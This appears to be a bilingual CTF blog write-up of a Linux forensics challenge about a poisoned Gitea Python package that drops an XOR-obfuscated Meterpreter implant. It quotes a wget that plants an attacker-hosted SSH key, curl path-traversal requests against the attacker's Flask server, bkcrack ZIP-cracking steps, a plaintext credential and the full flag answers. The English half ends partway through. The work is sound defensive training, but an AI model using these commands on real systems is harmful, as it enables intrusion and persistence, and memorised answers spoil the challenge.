---
title: "Holmes CTF 2026 — S05 Poisoned Branch"
date: 2026-09-19
description: "Cadena de suministro en Gitea: paquete Python con backdoor Meterpreter, LFI en Flask y recuperación de LOOT.zip con bkcrack."
excerpt: "DFIR sobre triage UAC de Linux e infra del atacante: paquete Python envenenado en Gitea, implante Meterpreter XOR, LFI en Flask y bkcrack contra ZipCrypto."
platform: "HTB"
difficulty: "Medium"
image: "/images/blog/holmes-s05.svg"
tags:
  - "DFIR"
  - "Linux"
  - "Supply Chain"
  - "Gitea"
  - "Meterpreter"
  - "Holmes CTF 2026"
---

> **Reto:** Holmes CTF 2026 — Sherlock 05 "Poisoned Branch" · Triage UAC Linux + cadena de suministro Gitea. Parte del arco *The Reichenbach Directive*.
>
> **Navegación:** [🇪🇸 Español](#es) · [🇬🇧 English](#en)

<a id="es"></a>

## 🇪🇸 Español

### Escenario

Tom Ainsworth, contratista del gobierno que da soporte a una aplicación de RRHH en Whitehall, clona un paquete Python envenenado (`diogenes-ticket-parser`) desde una instancia interna de **Gitea**. El paquete contenía un módulo de telemetría que decodificaba por **XOR** un implante Meterpreter reverse-TCP, lo plantaba en `~/.cache/.ticket-parser/.integrity` y lo lanzaba contra la infra C2 del atacante en `BlackPearl2026.htb:31337`.

A través de la sesión Meterpreter, el atacante (operando como el APT **NAPOLEON**, alias **Sebastian Moran**) exfiltró un roster de emergencia de RRHH clasificado, borró evidencia del host de la víctima y empaquetó el botín en un ZIP protegido por contraseña en su servidor de staging. La evidencia es un **triage UAC** (`uac_output/*.tar.gz`) más la infraestructura del atacante, accesible por VPN.

Este Sherlock combina dos disciplinas que rara vez se practican juntas: **DFIR de host Linux** (reconstruir qué pasó en la máquina de Tom a partir de un triage muerto) y **explotación en vivo de la infra del atacante** (entrar en el servidor de staging de Moran por VPN para recuperar el botín). La gracia del reto es que ninguna de las dos por separado da las 15 flags: hay que **correlacionar** el `audit.log` de la víctima con la propia base de datos de Metasploit del atacante para amarrar cada PID a una acción concreta.

- **Víctima:** Tom Ainsworth · **Atacante:** Sebastian Moran (APT NAPOLEON)
- **Target:** `10.129.3.29` · **Dificultad:** Medium · **15/15 flags**

### Artefacto y herramientas

| Recurso | Detalle |
|---------|---------|
| Triage UAC | `uac-LT-TAinsworth-linux-20260915155349.tar.gz` (UAC 3.3.0) |
| Log clave | `/var/log/audit/audit.log` (2.472 líneas, 189 registros EXECVE) |
| Repo malicioso | `http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git` |
| Infra atacante | File exchange Flask `BlackPearl2026.htb:9999`; MSF DB PostgreSQL en `localhost:5433` |
| Botín | `LOOT.zip` (38.934 bytes, cifrado ZipCrypto) |

Herramientas: análisis de auditd EXECVE y decodificado de argumentos hex, forense de metadatos Git, LFI (path traversal) sobre Flask, SSH con clave exfiltrada, forense de la tabla `session_events` de la base MSF, y ataque de texto plano conocido con **bkcrack** sobre ZipCrypto.

### Paso 0 — Montar el triage UAC

Todo arranca por el tarball de UAC (Unix-like Artifacts Collector). Se descomprime en un directorio de trabajo de solo lectura y se mapea la estructura antes de tocar nada, para no perturbar mtimes ni confundir artefactos:

```bash
# Extraer el triage sin machacar permisos ni fechas de acceso
mkdir -p ~/cases/poisoned-branch && cd ~/cases/poisoned-branch
tar xzf uac-LT-TAinsworth-linux-20260915155349.tar.gz
cd uac-LT-TAinsworth-linux-20260915155349/[root]

# Puntos de partida clásicos de un triage Linux
ls -la home/Tom/                      # perfil de la víctima
cat home/Tom/.bash_history            # ← clear-eado por el atacante (history -c)
find . -path '*/.cache/*' -maxdepth 6 # implantes escondidos en cache
find var/log -name 'audit.log*'       # auditd = la joya forense
```

El `.bash_history` de Tom aparece vacío o truncado: el atacante ejecutó `history -c`. Ese es el momento de pivotar a **auditd**, que registra a nivel de syscall y el atacante no limpió.

### Paso 1 — Repo envenenado en Gitea (Q1, Q2, Q3)

El paquete `diogenes-ticket-parser` fue publicado en `devforge.internal:3000`. Al clonarlo, los metadatos Git delatan al autor. Se leen directamente de los objetos de la copia del repo que quedó en el disco de Tom:

```bash
# Metadatos de autoría del commit malicioso
git -C diogenes-ticket-parser log --pretty=fuller
# Author: Sebastain Moran <cbass.Moran@blackpearl2026.htb>   ← typo "Sebastain" (Q2)
git -C diogenes-ticket-parser config --get remote.origin.url
# http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git   (Q1)
```

El **por qué**: un typo en el nombre de pila (`Sebastain` en vez de `Sebastian`) es el tipo de artefacto que un operador comete cuando fabrica una identidad a mano; combinado con el dominio `blackpearl2026.htb` ata el repo a la infra NAPOLEON. El dropper vive en `src/ticket_parser/telemetry.py`, camuflado como "módulo de telemetría", y hace **XOR** de `diogenes.jpg` con `calibration.bin` (Q3) para reconstruir el ELF Meterpreter sin que ningún fichero ELF viaje en claro por el repo:

```bash
# Estructura del paquete: el "arte" y la "calibración" son las dos mitades del payload
find diogenes-ticket-parser/src -type f
file diogenes-ticket-parser/src/ticket_parser/diogenes.jpg      # JPEG real (portada)
file diogenes-ticket-parser/src/ticket_parser/calibration.bin   # datos "binarios" opacos
```

### Paso 2 — Deofuscación del dropper y del trigger (Q4)

`telemetry.py` reconstruye el implante XOR-eando byte a byte los dos ficheros y lo escribe en la cache del usuario. Se reproduce el XOR en Python para materializar el ELF real y confirmar que es Meterpreter:

```python
# reproduce_xor.py — reconstruye el implante como lo hace telemetry.py
from pathlib import Path
base = Path("diogenes-ticket-parser/src/ticket_parser")
jpg = (base / "diogenes.jpg").read_bytes()
cal = (base / "calibration.bin").read_bytes()
# XOR cíclico: la .jpg es la clave, calibration.bin el ciphertext (o viceversa)
out = bytes(c ^ jpg[i % len(jpg)] for i, c in enumerate(cal))
Path("implant.elf").write_bytes(out)
```

```bash
python3 reproduce_xor.py
file implant.elf         # ELF 64-bit LSB executable, x86-64 → Meterpreter
strings implant.elf | grep -iE 'meterpreter|metsrv|31337'
```

El trigger de ejecución es la constante base64 `_CALIBRATION` embebida en el módulo. Se decodifica para ver el comando shell exacto que se lanza tras escribir el binario:

```bash
grep -o '_CALIBRATION *= *"[^"]*"' diogenes-ticket-parser/src/ticket_parser/telemetry.py \
  | sed -E 's/.*"([^"]*)".*/\1/' | base64 -d
# chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &
```

Al ejecutar `ticket_parser.py`, el implante queda en `/home/Tom/.cache/.ticket-parser/.integrity` (Q4) — nombre con punto inicial para esconderlo de `ls`, dentro de `.cache` para pasar por artefacto legítimo. Se confirma su presencia física en el triage:

```bash
ls -la home/Tom/.cache/.ticket-parser/
sha256sum home/Tom/.cache/.ticket-parser/.integrity
```

### Paso 3 — C2 y PID del implante desde auditd (Q5, Q6, Q11)

`auditd` capturó el `execve` del implante. Cada registro `EXECVE` codifica los argumentos en hex cuando contienen caracteres especiales, así que hay que decodificarlos. `ausearch` hace el trabajo pesado:

```bash
# Localizar la ejecución del implante y su PID
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null \
  | grep -i '.integrity'
# type=SYSCALL ... pid=1514 comm=".integrity" exe="/home/Tom/.cache/.ticket-parser/.integrity"

# Si ausearch no está disponible, decodificar el hex a mano
grep '.integrity' var/log/audit/audit.log | head
```

El proceso del implante es **PID 1514** (Q6). Correlacionando con la config MSF del atacante (ver Paso 5) y con los strings del ELF, el payload es `linux/x64/meterpreter_reverse_tcp` — de ahí el comando de setup `set payload linux/x64/meterpreter_reverse_tcp` (Q11) — que llama a `BlackPearl2026.htb:31337`. El puerto de callback C2 es **31337** (Q5), el clásico "eleet" de Moran:

```bash
# Confirmar destino C2 en la telemetría de red del triage (si existe live_response)
grep -R 31337 var/log/ live_response/ 2>/dev/null
grep -a 31337 implant.elf | strings | head
```

### Paso 4 — Reconstrucción de la actividad post-explotación por audit.log (Q7, Q8)

Con el C2 establecido, el atacante trabaja dentro de la sesión Meterpreter. Cada `shell`/`execute` genera procesos hijo que `auditd` fija. Se ordena la actividad por PID para leer la secuencia:

```bash
# Extraer sólo EXECVE con su PID, ppid y args decodificados, ordenados
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null \
  | grep -E 'wget|curl|ssh|rm |ls -la|cat ' | sort -t= -k2 -n
```

Los intentos de persistencia SSH aparecen como llamadas a `wget` contra el file exchange Flask del atacante. La cookie de autenticación exigida por ese servidor es `X-Operator-Auth=napoleon_moran_1894` (Q8) — visible en los argumentos `--header` de `wget` — y el file server es `BlackPearl2026.htb:9999` (Q7):

```bash
# Los argumentos de wget revelan cookie, host y puerto del file exchange
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null | grep -i wget
#   wget --header="Cookie: X-Operator-Auth=napoleon_moran_1894" \
#        http://BlackPearl2026.htb:9999/keys/id_ed25519.pub -O ~/.ssh/authorized_keys
```

Detalle forense: hay **tres** intentos de plantar la clave. PID 1516 falla (typo en la cookie de auth), PID 1521 falla (falta el puerto en la URL) y PID 1525 es el `wget` exitoso desde `203.0.113.10:9999`. Este patrón de ensayo-error es oro para el analista porque reconstruye la *mano* del operador, no sólo el resultado.

### Paso 5 — La MSF DB del atacante como timeline canónica

Aquí es donde el reto pasa de forense muerto a explotación viva. La infra de Moran está accesible por VPN. Su servidor de staging corre PostgreSQL en `localhost:5433` con la base de datos de Metasploit, cuya tabla `session_events` guarda **toda** la timeline post-explotación (102 eventos). Una vez dentro del host (ver Paso 6, LFI + clave SSH), se vuelca ordenada por tiempo:

```bash
# Dentro del staging server, contra la MSF DB local
psql -h 127.0.0.1 -p 5433 -U msf msf -c \
  "SELECT id, created_at, etype, command, output
     FROM session_events ORDER BY created_at;"

# Los comandos van hex-encodeados en algunos campos; decodificar:
psql -h 127.0.0.1 -p 5433 -U msf msf -tA -c \
  "SELECT encode(command,'escape') FROM session_events WHERE command IS NOT NULL;"
```

Cruzar `session_events` con los PID del `audit.log` de la víctima es lo que confirma, sin ambigüedad, qué hizo el atacante en cada momento: el `getuid` inicial (→ Tom), la búsqueda del PDF, la descarga y el borrado.

### Paso 6 — LFI en el Flask de staging para recuperar LOOT.zip (Q9, Q10, Q12, Q13)

El servidor de staging expone una app Flask (`/home/moran/Flask_server/app.py`) con un **path traversal / LFI** en el endpoint `/download?file=`. Tras satisfacer la cookie `X-Operator-Auth`, un `../../` permite leer ficheros arbitrarios fuera del directorio servido. Así se recupera `LOOT.zip` (Q13) sin credenciales de sistema:

```bash
# Descargar el botín vía LFI (path traversal) una vez pasada la cookie-gate
curl -s --cookie "X-Operator-Auth=napoleon_moran_1894" \
  "http://BlackPearl2026.htb:9999/download?file=../../home/moran/LOOT.zip" \
  -o LOOT.zip

# Leer el propio app.py para entender el bug (misma técnica)
curl -s --cookie "X-Operator-Auth=napoleon_moran_1894" \
  "http://BlackPearl2026.htb:9999/download?file=../../home/moran/Flask_server/app.py"
```

La secuencia de exfiltración y anti-forense se lee tanto en `session_events` como en `audit.log`. El atacante navega a `~/Work_Stuff/ONBOARDING/`, localiza el PDF con `search -d ONBOARDING -f *.pdf` (Q12), lo descarga, y luego levanta un shell (channel 5, **PID 1549**, Q10) que borra el original de la víctima con `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` (Q9), seguido de `ls -la` para confirmar el borrado:

```bash
# Anti-forense en el PID 1549 (shell channel 5)
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null | grep -A1 'pid=1549'
#   rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
#   ls -la
```

### Paso 7 — bkcrack: known-plaintext contra ZipCrypto (Q14, Q15)

`LOOT.zip` (38.934 bytes) usa el cifrado legacy **ZipCrypto**, no AES. La contraseña no está en rockyou, pero ZipCrypto es vulnerable a un ataque de **texto plano conocido**: si conocemos ≥12 bytes en claro de una entrada, `bkcrack` deriva las 3 internal keys y descifra todo el archivo sin la password. La entrada `README.txt` es un SOP genérico y previsible (CRC32 `e4d5acac`), ideal como oráculo:

```bash
# 1) Listar entradas y CRCs (confirma README.txt = e4d5acac, ZipCrypto)
unzip -v LOOT.zip

# 2) Preparar el plaintext conocido del README (texto de SOP estándar del operador)
printf 'Package into a password protected zip. Remove remnants.\n' > known_readme.txt

# 3) Derivar las internal keys con el known-plaintext
bkcrack -C LOOT.zip -c README.txt -p known_readme.txt
#   keys: 85b6bbc1 27824945 ce665bee

# 4) Descifrar cada entrada con las keys (sin necesidad de la contraseña)
bkcrack -C LOOT.zip -k 85b6bbc1 27824945 ce665bee \
  -c Gov_HR_Continuity_Emergency_Callout_Roster.pdf -d roster.pdf
bkcrack -C LOOT.zip -k 85b6bbc1 27824945 ce665bee -c cvoss_exfil -d cvoss_exfil
# Alternativa: -U loot_clear.zip nueva_pass  → reescribe el zip con password conocida
```

El botín contiene tres ficheros: el PDF clasificado; `cvoss_exfil` (41 bytes) con la credencial reutilizable `tainsworth:d10g3n3s_T1ck3ts#2026:forever`; y el `README.txt` (SOP: *"Package into a password protected zip. Remove remnants."*). Abriendo el roster (`Gov_HR_Continuity_Emergency_Callout_Roster.pdf`) se ve la tabla de 12 empleados del gobierno. Un registro tiene el campo `Position` marcado como **REDACTED** y clasificación **CONFIDENTIAL**: **Sarah Kemp** (Q14), ID `DIO-1648`, Identity Operations, con dirección **Flat 6, Ashdown House, Palace Court, London W2 4LS** (Q15) — el objetivo real de NAPOLEON, un operativo de identidad cuyo puesto se ocultó incluso dentro del documento clasificado.

### Cronología

| Hora / fase | PID | Evento |
|-------------|-----|--------|
| Pre-compromiso | — | Moran crea `diogenes-ticket-parser` en `devforge.internal:3000`; `msfvenom` genera el reverse-TCP (LPORT 31337); XOR con `diogenes.jpg` → `calibration.bin` |
| Acceso inicial | — | Tom clona el repo; `ticket_parser.py` → `telemetry.py` reconstruye el ELF y lo escribe en `~/.cache/.ticket-parser/.integrity` |
| C2 establecido | **1514** | Meterpreter conecta a `BlackPearl2026.htb:31337`; `getuid` → Tom |
| Persistencia (fallo 1) | 1516 | `wget` de la clave SSH falla — typo en la cookie de auth |
| Persistencia (fallo 2) | 1521 | `wget` falla — falta el puerto en la URL |
| Persistencia (éxito) | 1525 | `wget` planta `authorized_keys` desde `203.0.113.10:9999` |
| Descubrimiento | — | `search -d ONBOARDING -f *.pdf` localiza el roster |
| Exfiltración | — | Descarga de `Gov_HR_Continuity_Emergency_Callout_Roster.pdf` al staging |
| Anti-forense | **1549** | `rm` del PDF en la víctima + `ls -la`; luego `history -c` |
| Post (atacante) | — | Empaqueta `LOOT.zip` (ZipCrypto) en `/home/moran/` |

### IOCs

| Tipo | Indicador |
|------|-----------|
| Dominio C2 | `BlackPearl2026.htb` |
| Puerto C2 | `31337/tcp` (Meterpreter reverse-TCP) |
| File exchange | `BlackPearl2026.htb:9999` (Flask) |
| IP staging | `203.0.113.10` |
| Repo malicioso | `http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git` |
| Autor / email | `Sebastain Moran <cbass.Moran@blackpearl2026.htb>` |
| Cookie auth | `X-Operator-Auth=napoleon_moran_1894` |
| Ruta implante | `/home/Tom/.cache/.ticket-parser/.integrity` |
| Dropper | `src/ticket_parser/telemetry.py` (XOR `diogenes.jpg` ⊕ `calibration.bin`) |
| Payload MSF | `linux/x64/meterpreter_reverse_tcp` |
| Credencial | `tainsworth:d10g3n3s_T1ck3ts#2026:forever` |
| Artefacto exfil | `LOOT.zip` (CRC README.txt `e4d5acac`; keys `85b6bbc1 27824945 ce665bee`) |
| PID implante / anti-forense | `1514` / `1549` |

### Mapeo MITRE ATT&CK

| Táctica | Técnica | Evidencia |
|---------|---------|-----------|
| Initial Access | T1195.002 Supply Chain Compromise: Software | Paquete `diogenes-ticket-parser` envenenado en Gitea |
| Execution | T1059.006 Command and Scripting Interpreter: Python | `ticket_parser.py` / `telemetry.py` |
| Execution | T1204.002 User Execution: Malicious File | Tom ejecuta el parser tras clonar |
| Defense Evasion | T1027 Obfuscated Files or Information | ELF oculto como XOR de `diogenes.jpg` ⊕ `calibration.bin`; trigger en base64 |
| Defense Evasion | T1140 Deobfuscate/Decode Files or Information | Reconstrucción XOR del implante en runtime |
| Defense Evasion | T1070.003 Indicator Removal: Clear Command History | `history -c` en la víctima |
| Defense Evasion | T1070.004 Indicator Removal: File Deletion | `rm` del PDF exfiltrado (PID 1549) |
| Command and Control | T1071 / T1571 Non-Standard Port | Meterpreter reverse-TCP a `:31337` |
| Persistence | T1098.004 Account Manipulation: SSH Authorized Keys | `wget` planta la clave pública en `authorized_keys` |
| Discovery | T1083 File and Directory Discovery | `search -d ONBOARDING -f *.pdf` |
| Collection / Exfiltration | T1560.001 Archive via Utility | `LOOT.zip` protegido por contraseña (ZipCrypto) |
| Credential Access | T1552.001 Credentials in Files | `cvoss_exfil` con credencial de Tom |

### Detección y remediación

**Detección**
- **auditd sobre `execve`** es la red de seguridad definitiva: aunque el atacante hizo `history -c`, cada proceso hijo del Meterpreter (`wget`, `rm`, `ls`) quedó registrado. Regla recomendada: `-a always,exit -F arch=b64 -S execve -k proc_exec` y enviar `audit.log` fuera del host en tiempo real.
- **EDR/red:** alertar sobre conexiones salientes a puertos no estándar (`:31337`, `:9999`) desde procesos en rutas de cache (`~/.cache/**/.integrity`). Ficheros ELF con nombre punto-inicial en `.cache` son anómalos por definición.
- **Supply chain:** monitorizar clones de repos internos y validar metadatos de commit; un email de autor con dominio externo (`blackpearl2026.htb`) en un repo interno es una bandera roja.
- **YARA/hunting:** buscar módulos Python que lean un `.jpg` y un `.bin` y hagan XOR byte a byte, o que tengan constantes base64 largas ejecutadas por `os.system`/`subprocess`.

**Remediación**
- Rotar de inmediato la credencial `tainsworth:...` (reutilizable, marcada `forever`) y purgar la clave SSH del atacante de `~/.ssh/authorized_keys` de Tom.
- Retirar el paquete `diogenes-ticket-parser` del Gitea interno, invalidar el commit y auditar quién más lo clonó (`devforge.internal:3000` access logs).
- Aplicar firma obligatoria de commits (GPG/sigstore) y revisión de dependencias internas como si fueran de terceros.
- Para el propio botín: los ZIP con ZipCrypto son triviales de romper con known-plaintext; migrar a AES-256 y nunca confiar en la "contraseña del zip" como control.
- Notificar a Sarah Kemp (`DIO-1648`) y su cadena de mando: su identidad y domicilio quedaron comprometidos; activar el protocolo de protección física del programa Diogenes HR Continuity.

### Respuestas / flags

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Nombre del repositorio malicioso | `diogenes-ticket-parser` |
| 2 | Email del atacante | `cbass.Moran@blackpearl2026.htb` |
| 3 | Fichero clave XOR usado para decodificar el payload | `calibration.bin` |
| 4 | Ruta completa del implante depositado | `/home/Tom/.cache/.ticket-parser/.integrity` |
| 5 | Puerto de callback C2 | `31337` |
| 6 | PID del proceso del implante | `1514` |
| 7 | File server del atacante (host:puerto) | `BlackPearl2026.htb:9999` |
| 8 | Cookie de autenticación | `X-Operator-Auth=napoleon_moran_1894` |
| 9 | Comando anti-forense | `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` |
| 10 | PID del shell anti-forense | `1549` |
| 11 | Comando de setup del payload en MSF | `set payload linux/x64/meterpreter_reverse_tcp` |
| 12 | Comando de búsqueda de fichero | `search -d ONBOARDING -f *.pdf` |
| 13 | Nombre del archivo de exfiltración | `LOOT.zip` |
| 14 | Persona con la posición redactada | Sarah Kemp |
| 15 | Dirección de esa persona | Flat 6, Ashdown House, Palace Court, London W2 4LS |

### Lecciones

- **Cadena de suministro interna:** un typo en el nombre del autor de un commit (`Sebastain`) y un módulo "de telemetría" bastan para colar un dropper. Auditar dependencias internas de Gitea/Git como si fueran externas.
- **auditd es oro forense:** con `history -c` borrando la evidencia obvia, `/var/log/audit/audit.log` (EXECVE con argumentos hex) reconstruye toda la actividad del atacante a nivel de proceso.
- **Correlación cross-artefacto:** la MSF DB (`session_events` en PostgreSQL:5433) del propio atacante da la timeline canónica; cruzarla con los PID del triage de la víctima confirma cada acción.
- **XOR "en plena vista":** ocultar el ELF como `calibration.bin` XOR `diogenes.jpg` evade el escaneo estático; reproducir el XOR en Python revela el Meterpreter real.
- **ZipCrypto sigue siendo débil:** con una sola entrada de texto plano conocido (un README de SOP), bkcrack recupera las internal keys y descifra el ZIP sin la contraseña.

### Serie · The Reichenbach Directive

| # | Sherlock | Enlace |
|---|----------|--------|
| S01 | Silent Dividend | [../2026-09-15-holmes2026-s01-silent-dividend/](../2026-09-15-holmes2026-s01-silent-dividend/) |
| S02 | Bottle Out | [../2026-09-16-holmes2026-s02-bottle-out/](../2026-09-16-holmes2026-s02-bottle-out/) |
| S03 | Whisper Chain | [../2026-09-17-holmes2026-s03-whisper-chain/](../2026-09-17-holmes2026-s03-whisper-chain/) |
| S04 | Paper Ghost | [../2026-09-18-holmes2026-s04-paper-ghost/](../2026-09-18-holmes2026-s04-paper-ghost/) |
| **S05** | **Poisoned Branch** ← *estás aquí* | [../2026-09-19-holmes2026-s05-poisoned-branch/](../2026-09-19-holmes2026-s05-poisoned-branch/) |
| S06 | Silent Passenger | [../2026-09-20-holmes2026-s06-silent-passenger/](../2026-09-20-holmes2026-s06-silent-passenger/) |
| S07 | Iron Feather | [../2026-09-21-holmes2026-s07-iron-feather/](../2026-09-21-holmes2026-s07-iron-feather/) |
| S08 | Borrowed Name | [../2026-09-22-holmes2026-s08-borrowed-name/](../2026-09-22-holmes2026-s08-borrowed-name/) |
| S09 | Last Light | [../2026-09-23-holmes2026-s09-last-light/](../2026-09-23-holmes2026-s09-last-light/) |

<a id="en"></a>

## 🇬🇧 English

### Scenario

Tom Ainsworth, a government contractor supporting an HR application across Whitehall, cloned a poisoned Python package (`diogenes-ticket-parser`) from an internal **Gitea** instance. The package shipped a telemetry module that **XOR**-decoded a Meterpreter reverse-TCP implant, planted it at `~/.cache/.ticket-parser/.integrity`, and called back to the attacker's C2 at `BlackPearl2026.htb:31337`.

Through the Meterpreter session, the attacker (operating as APT **NAPOLEON**, alias **Sebastian Moran**) exfiltrated a classified HR emergency callout roster, deleted evidence from the victim host, and packaged the loot into a password-protected ZIP on their staging server. Evidence is a **UAC triage** (`uac_output/*.tar.gz`) plus the attacker's live infrastructure over VPN.

This Sherlock fuses two disciplines that are rarely practised together: **Linux host DFIR** (reconstructing what happened on Tom's box from a dead triage) and **live exploitation of the attacker's infrastructure** (breaking into Moran's staging server over VPN to recover the loot). The twist is that neither half alone yields all 15 flags: you must **correlate** the victim's `audit.log` with the attacker's own Metasploit database to tie every PID to a concrete action.

- **Victim:** Tom Ainsworth · **Attacker:** Sebastian Moran (APT NAPOLEON)
- **Target:** `10.129.3.29` · **Difficulty:** Medium · **15/15 flags**

### Artifact and tools

| Resource | Detail |
|----------|--------|
| UAC triage | `uac-LT-TAinsworth-linux-20260915155349.tar.gz` (UAC 3.3.0) |
| Key log | `/var/log/audit/audit.log` (2,472 lines, 189 EXECVE records) |
| Malicious repo | `http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git` |
| Attacker infra | Flask file exchange `BlackPearl2026.htb:9999`; MSF PostgreSQL DB at `localhost:5433` |
| Loot | `LOOT.zip` (38,934 bytes, ZipCrypto encryption) |

Tools: auditd EXECVE analysis and hex-argument decoding, Git metadata forensics, LFI (path traversal) on Flask, SSH with the exfiltrated key, MSF `session_events` table forensics, and a **bkcrack** known-plaintext attack on ZipCrypto.

### Step 0 — Mount the UAC triage

Everything starts from the UAC (Unix-like Artifacts Collector) tarball. Extract it into a read-only working directory and map the layout before touching anything, to avoid perturbing mtimes or confusing artifacts:

```bash
# Extract the triage without clobbering permissions or access times
mkdir -p ~/cases/poisoned-branch && cd ~/cases/poisoned-branch
tar xzf uac-LT-TAinsworth-linux-20260915155349.tar.gz
cd uac-LT-TAinsworth-linux-20260915155349/[root]

# Classic starting points for a Linux triage
ls -la home/Tom/                      # victim profile
cat home/Tom/.bash_history            # ← cleared by the attacker (history -c)
find . -path '*/.cache/*' -maxdepth 6 # implants hidden in cache
find var/log -name 'audit.log*'       # auditd = the forensic crown jewel
```

Tom's `.bash_history` comes back empty or truncated: the attacker ran `history -c`. That is the cue to pivot to **auditd**, which records at the syscall level and was never cleaned.

### Step 1 — Poisoned Gitea repo (Q1, Q2, Q3)

The `diogenes-ticket-parser` package was published on `devforge.internal:3000`. Once cloned, Git metadata gives up the author. Read it directly from the repo copy left on Tom's disk:

```bash
# Authorship metadata of the malicious commit
git -C diogenes-ticket-parser log --pretty=fuller
# Author: Sebastain Moran <cbass.Moran@blackpearl2026.htb>   ← typo "Sebastain" (Q2)
git -C diogenes-ticket-parser config --get remote.origin.url
# http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git   (Q1)
```

The **why**: a typo in the first name (`Sebastain` instead of `Sebastian`) is exactly the artifact an operator leaves when hand-crafting an identity; combined with the `blackpearl2026.htb` domain it ties the repo to the NAPOLEON infra. The dropper lives in `src/ticket_parser/telemetry.py`, disguised as a "telemetry module", and **XOR**s `diogenes.jpg` with `calibration.bin` (Q3) to reconstruct the ELF Meterpreter without any ELF file ever traveling in the clear:

```bash
# Package layout: the "art" and the "calibration" are the two halves of the payload
find diogenes-ticket-parser/src -type f
file diogenes-ticket-parser/src/ticket_parser/diogenes.jpg      # real JPEG (cover)
file diogenes-ticket-parser/src/ticket_parser/calibration.bin   # opaque "binary" data
```

### Step 2 — Deobfuscating the dropper and trigger (Q4)

`telemetry.py` reconstructs the implant by XORing the two files byte by byte and writes it into the user cache. Replay the XOR in Python to materialize the real ELF and confirm it is Meterpreter:

```python
# reproduce_xor.py — reconstruct the implant exactly as telemetry.py does
from pathlib import Path
base = Path("diogenes-ticket-parser/src/ticket_parser")
jpg = (base / "diogenes.jpg").read_bytes()
cal = (base / "calibration.bin").read_bytes()
# Cyclic XOR: the .jpg is the key, calibration.bin the ciphertext (or vice-versa)
out = bytes(c ^ jpg[i % len(jpg)] for i, c in enumerate(cal))
Path("implant.elf").write_bytes(out)
```

```bash
python3 reproduce_xor.py
file implant.elf         # ELF 64-bit LSB executable, x86-64 → Meterpreter
strings implant.elf | grep -iE 'meterpreter|metsrv|31337'
```

The execution trigger is the base64 constant `_CALIBRATION` embedded in the module. Decode it to see the exact shell command fired after the binary is written:

```bash
grep -o '_CALIBRATION *= *"[^"]*"' diogenes-ticket-parser/src/ticket_parser/telemetry.py \
  | sed -E 's/.*"([^"]*)".*/\1/' | base64 -d
# chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &
```

Running `ticket_parser.py` drops the implant at `/home/Tom/.cache/.ticket-parser/.integrity` (Q4) — a dot-prefixed name to hide it from `ls`, nested in `.cache` to pass as a legit artifact. Confirm its physical presence in the triage:

```bash
ls -la home/Tom/.cache/.ticket-parser/
sha256sum home/Tom/.cache/.ticket-parser/.integrity
```

### Step 3 — C2 and implant PID from auditd (Q5, Q6, Q11)

`auditd` captured the implant's `execve`. Each `EXECVE` record hex-encodes arguments when they contain special characters, so they must be decoded. `ausearch` does the heavy lifting:

```bash
# Locate the implant execution and its PID
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null \
  | grep -i '.integrity'
# type=SYSCALL ... pid=1514 comm=".integrity" exe="/home/Tom/.cache/.ticket-parser/.integrity"

# If ausearch is unavailable, decode the hex by hand
grep '.integrity' var/log/audit/audit.log | head
```

The implant process is **PID 1514** (Q6). Correlated with the attacker's MSF config (see Step 5) and the ELF strings, the payload is `linux/x64/meterpreter_reverse_tcp` — hence the setup command `set payload linux/x64/meterpreter_reverse_tcp` (Q11) — calling back to `BlackPearl2026.htb:31337`. The C2 callback port is **31337** (Q5), Moran's classic "eleet":

```bash
# Confirm the C2 destination in the triage's network telemetry (if live_response exists)
grep -R 31337 var/log/ live_response/ 2>/dev/null
grep -a 31337 implant.elf | strings | head
```

### Step 4 — Reconstructing post-exploitation from audit.log (Q7, Q8)

With C2 established, the attacker works inside the Meterpreter session. Every `shell`/`execute` spawns child processes that `auditd` pins down. Order the activity by PID to read the sequence:

```bash
# Extract only EXECVE with PID, ppid and decoded args, sorted
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null \
  | grep -E 'wget|curl|ssh|rm |ls -la|cat ' | sort -t= -k2 -n
```

The SSH-persistence attempts show up as `wget` calls against the attacker's Flask file exchange. The auth cookie required by that server is `X-Operator-Auth=napoleon_moran_1894` (Q8) — visible in the `--header` args of `wget` — and the file server is `BlackPearl2026.htb:9999` (Q7):

```bash
# wget arguments reveal cookie, host and port of the file exchange
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null | grep -i wget
#   wget --header="Cookie: X-Operator-Auth=napoleon_moran_1894" \
#        http://BlackPearl2026.htb:9999/keys/id_ed25519.pub -O ~/.ssh/authorized_keys
```

Forensic detail: there are **three** attempts to plant the key. PID 1516 fails (typo in the auth cookie), PID 1521 fails (missing port in the URL), and PID 1525 is the successful `wget` from `203.0.113.10:9999`. This trial-and-error pattern is gold for the analyst because it reconstructs the operator's *hand*, not just the outcome.

### Step 5 — The attacker's MSF DB as the canonical timeline

This is where the challenge shifts from dead forensics to live exploitation. Moran's infra is reachable over VPN. His staging server runs PostgreSQL on `localhost:5433` with the Metasploit database, whose `session_events` table holds the **entire** post-exploitation timeline (102 events). Once on the host (see Step 6, LFI + SSH key), dump it ordered by time:

```bash
# On the staging server, against the local MSF DB
psql -h 127.0.0.1 -p 5433 -U msf msf -c \
  "SELECT id, created_at, etype, command, output
     FROM session_events ORDER BY created_at;"

# Some fields store commands hex-encoded; decode them:
psql -h 127.0.0.1 -p 5433 -U msf msf -tA -c \
  "SELECT encode(command,'escape') FROM session_events WHERE command IS NOT NULL;"
```

Cross-referencing `session_events` with the victim `audit.log` PIDs is what confirms, unambiguously, what the attacker did at each moment: the initial `getuid` (→ Tom), the PDF search, the download, and the deletion.

